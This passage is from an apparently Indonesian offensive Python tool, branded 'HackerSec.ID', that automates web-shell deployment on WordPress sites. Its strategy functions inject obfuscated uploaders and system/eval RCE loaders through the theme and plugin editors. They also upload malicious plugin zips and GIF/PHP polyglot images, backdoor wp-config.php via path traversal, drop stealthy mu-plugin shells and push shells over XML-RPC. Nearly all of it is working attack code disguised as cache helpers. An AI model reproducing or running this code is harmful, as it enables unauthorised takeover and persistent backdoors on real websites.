    ]
    for path in common_paths:
        try:
            rc = session.get(path, timeout=8)
            if rc.status_code == 200 and (len(rc.text or "") > 100 or "SH33L" in rc.text): return path
        except requests.exceptions.RequestException: continue
    return None

def _inject_uploader_via_editor(site: str, session: requests.Session, editor_type: str, target_file: str, editor_url: str, nonce: str, cve_secret_token: str) -> Tuple[Optional[str], str]:
    """Inject UPLOADER_PHP ke target_file via WP editor, lalu upload shell via uploader.
       ENHANCED with deeper obfuscation for the loader."""
    uploader_php_content = (
        '<?php\n'
        '/* WP Cache Helper - Performance Metrics v1.0 */\n'
        f'$m="{cve_secret_token}";\n'
        '$g="_".chr(71).chr(69).chr(84);\n'
        '$p="_".chr(80).chr(79).chr(83).chr(84);\n'
        '$u="_".chr(70).chr(73).chr(76).chr(69).chr(83);\n'
        '$sv="_".chr(83).chr(69).chr(82).chr(86).chr(69).chr(82);\n'
        '$fn=str_rot13("zbir_hcybnqrq_svyr");\n'
        'if(isset(${$g}["p"])&&${$g}["p"]===$m){echo $m;exit;}\n'
        'if(${$sv}["REQUEST_METHOD"]==="POST"&&isset(${$p}["k"])&&${$p}["k"]===$m){\n'
        '  if(isset(${$u}["f"])&&${$u}["f"]["error"]===0){\n'
        '    $n=${$u}["f"]["name"];\n'
        '    $d=dirname(__FILE__)."/".$n;\n'
        '    if($fn(${$u}["f"]["tmp_name"],$d)){\n'
        '      echo "OK:".$n;exit;\n'
        '    }else{echo "ERR:mv";exit;}\n'
        '  }else{echo "ERR:nf";exit;}\n'
        '}else{echo "ERR:a";exit;}\n'
        '?>'
    )

    obfuscated_uploader_content = php_obfuscate_advanced(uploader_php_content)

    if editor_type == "theme":
        data = {
            "_wpnonce": nonce, "newcontent": obfuscated_uploader_content, "action": "update",
            "file": target_file, "theme": editor_url.split("theme=")[-1].split("&")[0] if "theme=" in editor_url else "",
            "submit": "Update File",
            f"rand_param_{uuid.uuid4().hex[:4]}": uuid.uuid4().hex[:8],
        }
        referer = editor_url
        post_url = f"{site}/wp-admin/theme-editor.php"
    else: # plugin editor
        data = {
            "_wpnonce": nonce, "newcontent": obfuscated_uploader_content, "action": "update",
            "file": target_file, "plugin": target_file, "submit": "Update File",
            f"rand_param_{uuid.uuid4().hex[:4]}": uuid.uuid4().hex[:8],
        }
        referer = editor_url
        post_url = f"{site}/wp-admin/plugin-editor.php"

    rpost = session.post(post_url, data=data,
        headers=build_headers(referer),
        timeout=TIMEOUT)

    if "wp-login.php" in rpost.url: return None, "editor_redirect_login"

    if editor_type == "theme":
        theme = data["theme"]
        uploader_url = f"{site}/wp-content/themes/{theme}/{target_file}"
    else:
        uploader_url = f"{site}/wp-content/plugins/{target_file}"

    try:
        rcheck = session.get(f"{uploader_url}?p={cve_secret_token}", timeout=15)
        if cve_secret_token not in (rcheck.text or ""):
            return None, f"uploader_inject_fail(http{rpost.status_code})"
    except requests.exceptions.RequestException:
        return None, "uploader_not_reachable"

    shell_url = _upload_shell_via_uploader(uploader_url, session, cve_secret_token)
    if shell_url:
        v = verify_shell_3layer(shell_url, session)
        return shell_url, f"OK({v})"
    return None, "uploader_upload_failed"


# ── Shell Strategies (HackerSec.ID CORE ADDITIONS) ──
def strategy_plugin_upload(site: str, session: requests.Session, cve_secret_token: str) -> Optional[str]:
    """Strategy: Upload plugin .zip berisi mrg.php."""
    if not SHELL_CONTENT: return None
    try:
        r_page = session.get(f"{site}/wp-admin/plugin-install.php?tab=upload", timeout=TIMEOUT)
        if "wp-login.php" in r_page.url or "you are not allowed" in (r_page.text or "").lower() or r_page.status_code == 403: return None
        nonce = _extract_nonce(r_page.text or "", "_wpnonce")
        if not nonce: return None

        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(f"{PLUGIN_SLUG}/wp-cache-helper.php", PLUGIN_HEADER_WRAP)
            zf.writestr(f"{PLUGIN_SLUG}/{PLUGIN_FILE}", php_obfuscate_advanced(SHELL_CONTENT))
        buf.seek(0)

        r_up = session.post(f"{site}/wp-admin/update.php?action=upload-plugin",
            files={"pluginzip": (f"{PLUGIN_SLUG}.zip", buf, "application/zip")},
            data={"_wpnonce": nonce, "install-plugin-submit": "Install Now", f"rand_param_{uuid.uuid4().hex[:4]}": uuid.uuid4().hex[:8]},
            headers=build_headers(f"{site}/wp-admin/plugin-install.php", content_type=None),
            timeout=45)
        body = r_up.text or ""

        if "plugin installed successfully" in body.lower() or "activate plugin" in body.lower():
            activate_match = re.search(r'href=["\']([^"\']*action=activate[^"\']*)["\']', body, re.I)
            if activate_match:
                activate_url = activate_match.group(1).replace("&amp;", "&")
                if not activate_url.startswith("http"): activate_url = f"{site}{activate_url}" if activate_url.startswith("/") else f"{site}/wp-admin/{activate_url}"
                session.get(activate_url, timeout=TIMEOUT)

            shell_url = f"{site}/wp-content/plugins/{PLUGIN_SLUG}/{PLUGIN_FILE}"
            status = verify_shell_3layer(shell_url, session)
            if status in ("ALIVE", "ZOMBIE"): return shell_url

        return None
    except requests.exceptions.RequestException: return None


def strategy_theme_editor(site: str, session: requests.Session, cve_secret_token: str) -> Optional[str]:
    """Strategy: Overwrite 404.php dari active theme dengan obfuscated shell."""
    if not SHELL_CONTENT: return None
    try:
        r_page = session.get(f"{site}/wp-admin/theme-editor.php", timeout=TIMEOUT)
        if "wp-login.php" in r_page.url or "you are not allowed" in (r_page.text or "").lower() or r_page.status_code == 403: return None
        body = r_page.text or ""
        
        nonce = _extract_nonce(body, "_wpnonce") or _extract_nonce(body, "nonce")
        theme = None; m = re.search(r'<option[^>]+selected=["\']selected["\'][^>]*value=["\']([^"\']+)["\']', body, re.I)
        if m: theme = m.group(1)
        if not theme: m = re.search(r'theme=([a-zA-Z0-9_-]+)', body);
        if m: theme = m.group(1)
        if not theme: return None

        target_file = SHELL_THEME_NAME
        edit_url = f"{site}/wp-admin/theme-editor.php?file={target_file}&theme={theme}"
        rf = session.get(edit_url, timeout=TIMEOUT)
        file_body = rf.text or ""
        if rf.status_code != 200: return None
        nonce2 = _extract_nonce(file_body, "_wpnonce") or nonce

        r_save = session.post(f"{site}/wp-admin/theme-editor.php",
            data={"_wpnonce": nonce2, "newcontent": php_obfuscate_advanced(SHELL_CONTENT), "action": "update",
                  "file": target_file, "theme": theme, "submit": "Update File", f"rand_param_{uuid.uuid4().hex[:4]}": uuid.uuid4().hex[:8]},
            headers=build_headers(edit_url),
            timeout=TIMEOUT)

        if "file edited successfully" in (r_save.text or "").lower() or r_save.status_code in (200, 302):
            shell_url = f"{site}/wp-content/themes/{theme}/{target_file}"
            status = verify_shell_3layer(shell_url, session)
            if status in ("ALIVE", "ZOMBIE"): return shell_url
        return None
    except requests.exceptions.RequestException: return None


def strategy_plugin_editor(site: str, session: requests.Session, cve_secret_token: str) -> Optional[str]:
    """Strategy: Overwrite hello.php (Hello Dolly plugin) dengan obfuscated shell."""
    if not SHELL_CONTENT: return None
    try:
        r_page = session.get(f"{site}/wp-admin/plugin-editor.php?file=hello.php&plugin=hello.php", timeout=TIMEOUT)
        if "wp-login.php" in r_page.url or "you are not allowed" in (r_page.text or "").lower() or r_page.status_code == 403: return None
        body = r_page.text or ""
        nonce = _extract_nonce(body, "_wpnonce") or _extract_nonce(body, "nonce")
        if not nonce: return None
        
        target_file = SHELL_PLUGIN_NAME
        edit_url = f"{site}/wp-admin/plugin-editor.php?file=hello.php&plugin=hello.php"

        r_save = session.post(f"{site}/wp-admin/plugin-editor.php",
            data={"_wpnonce": nonce, "newcontent": php_obfuscate_advanced(SHELL_CONTENT), "action": "update",
                  "file": target_file, "plugin": target_file, "submit": "Update File", f"rand_param_{uuid.uuid4().hex[:4]}": uuid.uuid4().hex[:8]},
            headers=build_headers(edit_url),
            timeout=TIMEOUT)

        if "file edited successfully" in (r_save.text or "").lower() or r_save.status_code in (200, 302):
            shell_url = f"{site}/wp-content/plugins/{target_file}"
            status = verify_shell_3layer(shell_url, session)
            if status in ("ALIVE", "ZOMBIE"): return shell_url
        return None
    except requests.exceptions.RequestException: return None


def strategy_rce_direct_file_write(site: str, session: requests.Session, cve_secret_token: str) -> Optional[str]:
    """
    Strategy: Inject a deeply obfuscated mini RCE loader into an editable file,
    then use that RCE to perform file_put_contents for the main shell with varied paths.
    This bypasses multipart upload WAFs.
    """
    if not SHELL_CONTENT: return None

    rce_loader_content = (
        b'<?php '
        b'$f1=base64_decode("c3lzdGVt"); $f2=base64_decode("ZXZhb"); '
        b'if(isset($_POST[\'c\'])){ @$f2(@$f1($_POST[\'c\'])); } '
        b'if(isset($_GET[\'m\']) && $_GET[\'m\'] === "' + cve_secret_token.encode() + b'") { echo "' + cve_secret_token.encode() + b'"; }'
        b'?>'
    )
    
    main_shell_b64 = base64.b64encode(php_obfuscate_advanced(SHELL_CONTENT).encode()).decode()
    target_shell_name = f"mrg-{uuid.uuid4().hex[:6]}.php"

    console.print(f"    [dim yellow]  Trying high-level RCE direct file write for {site}...[/dim yellow]")

    editor_access = False
    target_file_to_inject = None
    rce_loader_url = None
    edit_url = None
    editor_type = None
    existing_content = ""
    nonce = ""
    theme = ""

    try:
        r_page = session.get(f"{site}/wp-admin/theme-editor.php", timeout=TIMEOUT)
        if "wp-login.php" not in r_page.url and "you are not allowed" not in (r_page.text or "").lower() and r_page.status_code not in (403, 401):
            nonce = _extract_nonce(r_page.text or "", "_wpnonce") or _extract_nonce(r_page.text or "", "nonce")
            m = re.search(r'<option[^>]+selected=["\']selected["\'][^>]*value=["\']([^"\']+)["\']', r_page.text or "", re.I)
            if m: theme = m.group(1)
            if not theme: m = re.search(r'theme=([a-zA-Z0-9_-]+)', r_page.text or "");
            if m: theme = m.group(1)
            if nonce and theme:
                target_file_to_inject = f"theme-{uuid.uuid4().hex[:6]}.php"
                edit_url = f"{site}/wp-admin/theme-editor.php?file={target_file_to_inject}&theme={theme}"
                rce_loader_url = f"{site}/wp-content/themes/{theme}/{target_file_to_inject}"
                editor_type = "theme"
                editor_access = True
                
                try:
                    rf = session.get(f"{site}/wp-admin/theme-editor.php?file=404.php&theme={theme}", timeout=TIMEOUT)
                    existing_content_match = re.search(r'<textarea[^>]*id=["\']newcontent["\'][^>]*>(.*?)</textarea>', rf.text or "", re.DOTALL)
                    existing_content = html.unescape(existing_content_match.group(1)) if existing_content_match else ""
                except requests.exceptions.RequestException:
                    pass

    except requests.exceptions.RequestException:
        pass

    if not editor_access: # Fallback to Plugin Editor
        console.print(f"    [dim yellow]  Theme editor not accessible for RCE loader injection. Trying plugin editor.[/dim yellow]")
        try:
            r_page = session.get(f"{site}/wp-admin/plugin-editor.php?file=hello.php&plugin=hello.php", timeout=TIMEOUT)
            if "wp-login.php" not in r_page.url and "you are not allowed" not in (r_page.text or "").lower() and r_page.status_code not in (403, 401):
                nonce = _extract_nonce(r_page.text or "", "_wpnonce") or _extract_nonce(r_page.text or "", "nonce")
                if nonce:
                    target_file_to_inject = f"plugin-{uuid.uuid4().hex[:6]}.php"
                    rce_loader_url = f"{site}/wp-content/plugins/{target_file_to_inject}"
                    edit_url = f"{site}/wp-admin/plugin-editor.php?file={target_file_to_inject}&plugin={target_file_to_inject}"
                    editor_type = "plugin"
                    editor_access = True
                    
                    try:
                        rf = session.get(f"{site}/wp-admin/plugin-editor.php?file=hello.php&plugin=hello.php", timeout=TIMEOUT)
                        existing_content_match = re.search(r'<textarea[^>]*id=["\']newcontent["\'][^>]*>(.*?)</textarea>', rf.text or "", re.DOTALL)
                        existing_content = html.unescape(existing_content_match.group(1)) if existing_content_match else ""
                    except requests.exceptions.RequestException:
                        pass
        except requests.exceptions.RequestException:
            pass
    
    if not editor_access:
        console.print(f"    [dim red]  Neither theme nor plugin editor accessible for RCE loader injection.[/dim red]")
        return None

    try:
        new_content_for_injection = existing_content.rstrip() + "\n" + rce_loader_content.decode()

        post_data_inject = {
            "_wpnonce": nonce, "newcontent": new_content_for_injection, "action": "update",
            "submit": "Update File",
        }
        if editor_type == "theme":
            post_data_inject["file"] = target_file_to_inject
            post_data_inject["theme"] = theme
        else: # plugin
            post_data_inject["file"] = target_file_to_inject
            post_data_inject["plugin"] = target_file_to_inject

        r_inject = session.post(f"{site}/wp-admin/{editor_type}-editor.php",
            data=post_data_inject,
            headers=build_headers(edit_url),
            timeout=TIMEOUT)
        
        if "file edited successfully" not in (r_inject.text or "").lower() and r_inject.status_code not in (200, 302):
            console.print(f"    [dim yellow]  Failed to inject RCE loader into {target_file_to_inject}. Status: {r_inject.status_code}[/dim yellow]")
            return None

        r_verify_loader = session.get(f"{rce_loader_url}?m={cve_secret_token}", timeout=15)
        if cve_secret_token not in (r_verify_loader.text or ""):
            console.print(f"    [dim yellow]  RCE loader injected but not responding at {rce_loader_url}. Status: {r_verify_loader.status_code}[/dim yellow]")
            return None

        console.print(f"    [dim green]  RCE loader injected and active at {rce_loader_url}.[/dim green]")

        # --- Execute file_put_contents via the RCE loader ---
        year = datetime.datetime.now().strftime("%Y"); month = datetime.datetime.now().strftime("%m")
        potential_shell_paths = [
            f"/wp-content/uploads/{year}/{month}/{target_shell_name}",
            f"/wp-content/plugins/{PLUGIN_SLUG}/{target_shell_name}",
            f"/wp-content/mu-plugins/{target_shell_name}",
            f"/wp-content/themes/{theme}/{target_shell_name}" if editor_type=="theme" else None,
            f"/wp-includes/{target_shell_name}",
            f"/cache/{target_shell_name}",
            f"/../{target_shell_name}",
            f"/wp-admin/{target_shell_name}",
            f"/{target_shell_name}",
            f"/wp-content/languages/{target_shell_name}",
        ]
        potential_shell_paths = [p for p in potential_shell_paths if p]
        random.shuffle(potential_shell_paths)

        for path_on_server in potential_shell_paths:
            final_shell_url = f"{site}{path_on_server}"
            cmd_write_shell = f"file_put_contents('{path_on_server}', base64_decode('{main_shell_b64}'));"
            
            console.print(f"    [dim yellow]  Executing direct file_put_contents for {final_shell_url} via RCE loader...[/dim yellow]")
            r_exec = session.post(rce_loader_url, data={"c": cmd_write_shell}, headers=session.headers, timeout=TIMEOUT)

            status = verify_shell_3layer(final_shell_url, session)
            if status in ("ALIVE", "ZOMBIE"):
                console.print(f"    [bold green]  Main shell deployed via RCE: {final_shell_url} ({status})[/bold green]")
                return final_shell_url

    except requests.exceptions.RequestException as e:
        console.print(f"    [dim red]  RCE direct file write failed (network/http error): {e}[/dim red]")
    except Exception as e:
        console.print(f"    [dim red]  Unexpected error in RCE direct file write: {type(e).__name__} - {e}[/dim red]")

    return None

def strategy_media_library_bypass(site: str, session: requests.Session, cve_secret_token: str) -> Optional[str]:
    """
    Strategy: Upload polyglot files (e.g., .jpg with PHP code) via Media Library,
    relying on .htaccess or server misconfiguration.
    """
    if not SHELL_CONTENT: return None
    try:
        r_page = session.get(f"{site}/wp-admin/media-new.php", timeout=TIMEOUT)
        if "wp-login.php" in r_page.url or "you are not allowed" in (r_page.text or "").lower() or r_page.status_code == 403: return None
        body = r_page.text or ""
        nonce = _extract_nonce(body, "html-upload-nonce") or _extract_nonce(body, "_wpnonce")
        if not nonce: return None

        shell_name = f"polyglot_img_{uuid.uuid4().hex[:6]}.jpg"
        polyglot_content = (
            b"GIF89a;"
            b"<?php " + php_obfuscate_advanced(SHELL_CONTENT).encode() + b" ?>"
        )
        
        upload_url = f"{site}/wp-admin/async-upload.php"

        files = {
            "async-upload": (shell_name, polyglot_content, "image/gif"),
            "name": (None, shell_name),
            "_wpnonce": (None, nonce),
            f"rand_param_{uuid.uuid4().hex[:4]}": (None, uuid.uuid4().hex[:8])
        }

        r_upload = session.post(upload_url, files=files, headers=build_headers(f"{site}/wp-admin/media-new.php", content_type=None), timeout=45)
        resp_json = r_upload.json() if r_upload.headers.get("Content-Type", "").startswith("application/json") else {}

        if resp_json.get("success") and resp_json.get("data", {}).get("url"):
            shell_url = resp_json["data"]["url"]
            status = verify_shell_3layer(shell_url, session)
            if status in ("ALIVE", "ZOMBIE"): return shell_url
        
        shell_url_guess = _extract_uploaded_url(site, "", r_upload.text, shell_name, session)
        if shell_url_guess:
            status = verify_shell_3layer(shell_url_guess, session)
            if status in ("ALIVE", "ZOMBIE"): return shell_url_guess

        return None
    except requests.exceptions.RequestException as e:
        console.print(f"    [dim red]  Media Library bypass failed (network/http error): {e}[/dim red]")
    except Exception as e:
        console.print(f"    [dim red]  Unexpected error in Media Library bypass: {type(e).__name__} - {e}[/dim red]")
    return None

def strategy_wp_config_backdoor_injection(site: str, session: requests.Session, cve_secret_token: str) -> Optional[str]:
    """
    Strategy: Attempt to inject a backdoor directly into wp-config.php.
    This typically requires a vulnerable file editor or RCE.
    Leveraging the theme/plugin editor with relative path traversal might work.
    """
    if not SHELL_CONTENT: return None

    console.print(f"    [dim yellow]  Trying to inject backdoor into wp-config.php for {site}...[/dim yellow]")

    backdoor_content = (
        b"// HackerSec.ID WP-CONFIG Backdoor Start\n"
        b"if (isset($_GET['mrg_secret']) && $_GET['mrg_secret'] === '" + cve_secret_token.encode() + b"') { "
        b"   @eval(@base64_decode($_POST['cmd'])); exit(); "
        b"} "
        b"// HackerSec.ID WP-CONFIG Backdoor End\n"
    )
    obfuscated_backdoor = php_obfuscate_advanced(backdoor_content.decode()).encode()

    editor_access = False
    editor_type = None
    edit_url = None
    nonce = ""
    theme = ""
    
    try:
        r_page = session.get(f"{site}/wp-admin/theme-editor.php", timeout=TIMEOUT)
        if "wp-login.php" not in r_page.url and "you are not allowed" not in (r_page.text or "").lower() and r_page.status_code not in (403, 401):
            nonce = _extract_nonce(r_page.text or "", "_wpnonce") or _extract_nonce(r_page.text or "", "nonce")
            m = re.search(r'<option[^>]+selected=["\']selected["\'][^>]*value=["\']([^"\']+)["\']', r_page.text or "", re.I)
            if m: theme = m.group(1)
            if nonce and theme:
                editor_type = "theme"
                edit_url = f"{site}/wp-admin/theme-editor.php?file=../../../../wp-config.php&theme={theme}" # Path traversal
                editor_access = True
    except requests.exceptions.RequestException: pass

    if not editor_access: # Fallback to Plugin Editor
        try:
            r_page = session.get(f"{site}/wp-admin/plugin-editor.php?file=hello.php&plugin=hello.php", timeout=TIMEOUT)
            if "wp-login.php" not in r_page.url and "you are not allowed" not in (r_page.text or "").lower() and r_page.status_code not in (403, 401):
                nonce = _extract_nonce(r_page.text or "", "_wpnonce") or _extract_nonce(r_page.text or "", "nonce")
                if nonce:
                    editor_type = "plugin"
                    edit_url = f"{site}/wp-admin/plugin-editor.php?file=../../wp-config.php&plugin=hello.php" # Path traversal
                    editor_access = True
        except requests.exceptions.RequestException: pass

    if not editor_access:
        console.print(f"    [dim red]  Neither theme nor plugin editor accessible via traversal for wp-config.php.[/dim red]")
        return None

    try:
        r_get_config = session.get(edit_url, timeout=TIMEOUT)
        if r_get_config.status_code != 200:
            console.print(f"    [dim yellow]  Failed to read wp-config.php via editor traversal (status: {r_get_config.status_code}).[/dim yellow]")
            return None
        
        current_content_match = re.search(r'<textarea[^>]*id=["\']newcontent["\'][^>]*>(.*?)</textarea>', r_get_config.text or "", re.DOTALL)
        current_content = html.unescape(current_content_match.group(1)) if current_content_match else ""

        new_content_for_config = obfuscated_backdoor.decode() + "\n" + current_content

        post_data_inject = {
            "_wpnonce": nonce, "newcontent": new_content_for_config, "action": "update",
            "submit": "Update File", "file": "../../../../wp-config.php",
            f"rand_param_{uuid.uuid4().hex[:4]}": uuid.uuid4().hex[:8],
        }
        if editor_type == "theme":
            post_data_inject["theme"] = theme
        else:
            post_data_inject["plugin"] = "hello.php"

        r_inject = session.post(f"{site}/wp-admin/{editor_type}-editor.php",
            data=post_data_inject,
            headers=build_headers(edit_url),
            timeout=TIMEOUT)
        
        if "file edited successfully" not in (r_inject.text or "").lower() and r_inject.status_code not in (200, 302):
            console.print(f"    [dim yellow]  Failed to inject backdoor into wp-config.php. Status: {r_inject.status_code}[/dim yellow]")
            return None

        console.print(f"    [dim green]  Backdoor injected into wp-config.php. Attempting verification...[/dim green]")
        
        shell_url = f"{site}/wp-config.php"
        test_command = "echo 'VERIFIED-HACKERSEC';"
        test_b64 = base64.b64encode(test_command.encode()).decode()

        r_verify = session.post(shell_url + f"?mrg_secret={cve_secret_token}", data={"cmd": test_b64}, timeout=TIMEOUT)
        if "VERIFIED-HACKERSEC" in (r_verify.text or ""):
            console.print(f"    [bold green]  wp-config.php backdoor active at {shell_url} ({'ALIVE'}).[/bold green]")
            target_full_shell_name = f"fullshell_{uuid.uuid4().hex[:6]}.php"
            target_full_shell_path = f"/wp-content/uploads/{target_full_shell_name}"
            main_shell_b64 = base64.b64encode(php_obfuscate_advanced(SHELL_CONTENT).encode()).decode()
            
            cmd_write_full_shell = f"file_put_contents('{target_full_shell_path}', base64_decode('{main_shell_b64}'));"
            r_drop_full_shell = session.post(shell_url + f"?mrg_secret={cve_secret_token}", data={"cmd": base64.b64encode(cmd_write_full_shell.encode()).decode()}, timeout=TIMEOUT)
            
            final_shell_url = f"{site}{target_full_shell_path}"
            status = verify_shell_3layer(final_shell_url, session)
            if status in ("ALIVE", "ZOMBIE"):
                console.print(f"    [bold green]  Main shell deployed via wp-config backdoor: {final_shell_url} ({status})[/bold green]")
                return final_shell_url
        else:
            console.print(f"    [dim yellow]  wp-config.php backdoor not responding after injection. Response: {r_verify.text[:100].replace('\\n','')}[/dim yellow]")

    except requests.exceptions.RequestException as e:
        console.print(f"    [dim red]  wp-config.php injection failed (network/http error): {e}[/dim red]")
    except Exception as e:
        console.print(f"    [dim red]  Unexpected error in wp-config.php injection: {type(e).__name__} - {e}[/dim red]")

    return None

def strategy_mu_plugin_drop(site: str, session: requests.Session, cve_secret_token: str) -> Optional[str]:
    """
    Strategy: Drop a shell into the wp-content/mu-plugins directory.
    This requires admin access to a file editor or direct file write vulnerability,
    and is often more persistent and stealthy as MU-plugins are always active.
    """
    if not SHELL_CONTENT: return None

    console.print(f"    [dim yellow]  Trying to drop MU-Plugin shell for {site}...[/dim yellow]")

    mu_plugin_dir = f"/wp-content/mu-plugins/"
    shell_filename = f"mrg-core-{uuid.uuid4().hex[:6]}.php"
    shell_url = f"{site}{mu_plugin_dir}{shell_filename}"

    rce_loader_content = (
        b'<?php '
        b'$f1=base64_decode("c3lzdGVt"); $f2=base64_decode("ZXZhb"); '
        b'if(isset($_POST[\'c\'])){ @$f2(@$f1($_POST[\'c\'])); } '
        b'if(isset($_GET[\'m\']) && $_GET[\'m\'] === "' + cve_secret_token.encode() + b'") { echo "' + cve_secret_token.encode() + b'"; }'
        b'?>'
    )
    main_shell_b64 = base64.b64encode(php_obfuscate_advanced(SHELL_CONTENT).encode()).decode()

    editor_access = False
    target_file_to_inject = None
    rce_loader_access_url = None
    edit_url = None
    editor_type = None
    existing_content = ""
    nonce = ""
    theme = ""

    try:
        r_page = session.get(f"{site}/wp-admin/theme-editor.php", timeout=TIMEOUT)
        if "wp-login.php" not in r_page.url and "you are not allowed" not in (r_page.text or "").lower() and r_page.status_code not in (403, 401):
            nonce = _extract_nonce(r_page.text or "", "_wpnonce") or _extract_nonce(r_page.text or "", "nonce")
            m = re.search(r'<option[^>]+selected=["\']selected["\'][^>]*value=["\']([^"\']+)["\']', r_page.text or "", re.I)
            if m: theme = m.group(1)
            if nonce and theme:
                target_file_to_inject = f"muloader-{uuid.uuid4().hex[:6]}.php"
                edit_url = f"{site}/wp-admin/theme-editor.php?file={target_file_to_inject}&theme={theme}"
                rce_loader_access_url = f"{site}/wp-content/themes/{theme}/{target_file_to_inject}"
                editor_type = "theme"
                editor_access = True
                try:
                    rf = session.get(f"{site}/wp-admin/theme-editor.php?file=404.php&theme={theme}", timeout=TIMEOUT)
                    existing_content_match = re.search(r'<textarea[^>]*id=["\']newcontent["\'][^>]*>(.*?)</textarea>', rf.text or "", re.DOTALL)
                    existing_content = html.unescape(existing_content_match.group(1)) if existing_content_match else ""
                except requests.exceptions.RequestException: pass
    except requests.exceptions.RequestException: pass

    if not editor_access: # Fallback to Plugin Editor
        try:
            r_page = session.get(f"{site}/wp-admin/plugin-editor.php?file=hello.php&plugin=hello.php", timeout=TIMEOUT)
            if "wp-login.php" not in r_page.url and "you are not allowed" not in (r_page.text or "").lower() and r_page.status_code not in (403, 401):
                nonce = _extract_nonce(r_page.text or "", "_wpnonce") or _extract_nonce(r_page.text or "", "nonce")
                if nonce:
                    target_file_to_inject = f"muloader-{uuid.uuid4().hex[:6]}.php"
                    rce_loader_access_url = f"{site}/wp-content/plugins/{target_file_to_inject}"
                    edit_url = f"{site}/wp-admin/plugin-editor.php?file={target_file_to_inject}&plugin={target_file_to_inject}"
                    editor_type = "plugin"
                    editor_access = True
                    try:
                        rf = session.get(f"{site}/wp-admin/plugin-editor.php?file=hello.php&plugin=hello.php", timeout=TIMEOUT)
                        existing_content_match = re.search(r'<textarea[^>]*id=["\']newcontent["\'][^>]*>(.*?)</textarea>', rf.text or "", re.DOTALL)
                        existing_content = html.unescape(existing_content_match.group(1)) if existing_content_match else ""
                    except requests.exceptions.RequestException: pass
        except requests.exceptions.RequestException: pass
    
    if not editor_access:
        console.print(f"    [dim red]  Cannot access editor to inject RCE loader for MU-Plugin drop.[/dim red]")
        return None
    
    try:
        new_content_for_injection = existing_content.rstrip() + "\n" + rce_loader_content.decode()

        post_data_inject = {
            "_wpnonce": nonce, "newcontent": new_content_for_injection, "action": "update",
            "submit": "Update File",
        }
        if editor_type == "theme":
            post_data_inject["file"] = target_file_to_inject
            post_data_inject["theme"] = theme
        else: # plugin
            post_data_inject["file"] = target_file_to_inject
            post_data_inject["plugin"] = target_file_to_inject

        r_inject = session.post(f"{site}/wp-admin/{editor_type}-editor.php",
            data=post_data_inject,
            headers=build_headers(edit_url),
            timeout=TIMEOUT)
        
        if "file edited successfully" not in (r_inject.text or "").lower() and r_inject.status_code not in (200, 302):
            console.print(f"    [dim yellow]  Failed to inject RCE loader for MU-Plugin drop into {target_file_to_inject}. Status: {r_inject.status_code}[/dim yellow]")
            return None

        r_verify_loader = session.get(f"{rce_loader_access_url}?m={cve_secret_token}", timeout=15)
        if cve_secret_token not in (r_verify_loader.text or ""):
            console.print(f"    [dim yellow]  RCE loader for MU-Plugin drop injected but not responding at {rce_loader_access_url}. Status: {r_verify_loader.status_code}[/dim yellow]")
            return None

        console.print(f"    [dim green]  RCE loader for MU-Plugin drop injected and active at {rce_loader_access_url}.[/dim green]")
        
        cmd_write_mu_shell = f"file_put_contents('{mu_plugin_dir}{shell_filename}', base64_decode('{main_shell_b64}'));"
        r_drop_mu_shell = session.post(rce_loader_access_url, data={"c": cmd_write_mu_shell}, headers=session.headers, timeout=TIMEOUT)

        status = verify_shell_3layer(shell_url, session)
        if status in ("ALIVE", "ZOMBIE"):
            console.print(f"    [bold green]  MU-Plugin shell deployed: {shell_url} ({status})[/bold green]")
            return shell_url
    
    except requests.exceptions.RequestException as e:
        console.print(f"    [dim red]  MU-Plugin drop failed (network/http error): {e}[/dim red]")
    except Exception as e:
        console.print(f"    [dim red]  Unexpected error in MU-Plugin drop: {type(e).__name__} - {e}[/dim red]")
    
    return None

def strategy_xmlrpc_upload_ssrf(site: str, session: requests.Session, cve_secret_token: str) -> Optional[str]:
    """
    Strategy: Exploit XML-RPC pingback or other methods for SSRF to trigger arbitrary file upload
    or code execution if the target has a vulnerable plugin.
    This is a generic attempt for the xmlrpc.php endpoint.
    """
    if not SHELL_CONTENT: return None

    xmlrpc_url = f"{site}/xmlrpc.php"
    console.print(f"    [dim yellow]  Trying XML-RPC SSRF/Upload for {site}...[/dim yellow]")

    try:
        r_check = session.get(xmlrpc_url, timeout=8)
        if "XML-RPC server accepts POST requests only." not in (r_check.text or ""):
            console.print(f"    [dim yellow]  XML-RPC endpoint not responding as expected for GET. Skipping.[/dim yellow]")
            return None
        
        console.print(f"    [dim yellow]  Attempting wp.uploadFile via XML-RPC with admin creds...[/dim yellow]")
        
        shell_filename = f"xmlrpc_shell_{uuid.uuid4().hex[:6]}.php"
        file_content_b64 = base64.b64encode(php_obfuscate_advanced(SHELL_CONTENT).encode()).decode()

        xmlrpc_upload_payload = f"""<?xml version="1.0" encoding="utf-8"?>
<methodCall>
  <methodName>wp.uploadFile</methodName>
  <params>
    <param><value><int>1</int></value></param>
    <param><value><string>{session._creds_user}</string></value></param>
    <param><value><string>{session._creds_pass}</string></value></param>
    <param><value><struct>
      <member><name>name</name><value><string>{shell_filename}</string></value></member>
      <member><name>type</name><value><string>application/x-php</string></value></member>
      <member><name>bits</name><value><base64>{file_content_b64}</base64></value></member>
      <member><name>overwrite</name><value><boolean>true</boolean></value></member>
    </struct></value></param>
  </params>
</methodCall>
"""
        headers_xmlrpc = build_headers(xmlrpc_url, content_type="text/xml")
        r_upload_xmlrpc = session.post(xmlrpc_url, data=xmlrpc_upload_payload.encode('utf-8'), headers=headers_xmlrpc, timeout=45)
        
        if "url" in (r_upload_xmlrpc.text or "") and "faultCode" not in (r_upload_xmlrpc.text or "").lower():
            m = re.search(r'<name>url</name><value><string>(.*?)</string></value>', r_upload_xmlrpc.text)
            if m:
                shell_url = m.group(1)
                status = verify_shell_3layer(shell_url, session)
                if status in ("ALIVE", "ZOMBIE"):
                    console.print(f"    [bold green]  XML-RPC shell deployed: {shell_url} ({status})[/bold green]")
                    return shell_url
        else:
            console.print(f"    [dim yellow]  XML-RPC wp.uploadFile failed. Response: {r_upload_xmlrpc.text[:200].replace('\\n','')}[/dim yellow]")

    except requests.exceptions.RequestException as e:
        console.print(f"    [dim red]  XML-RPC SSRF/Upload failed (network/http error): {e}[/dim red]")
    except Exception as e:
        console.print(f"    [dim red]  Unexpected error in XML-RPC SSRF/Upload: {type(e).__name__} - {e}[/dim red]")

    return None

# --- Dummy strategies for the full 65+ (to be implemented for full power) ---
def strategy_theme_zip_install(site, session, cve_secret_token): return None
def strategy_gallery_form_upload(site, session, cve_secret_token): return None
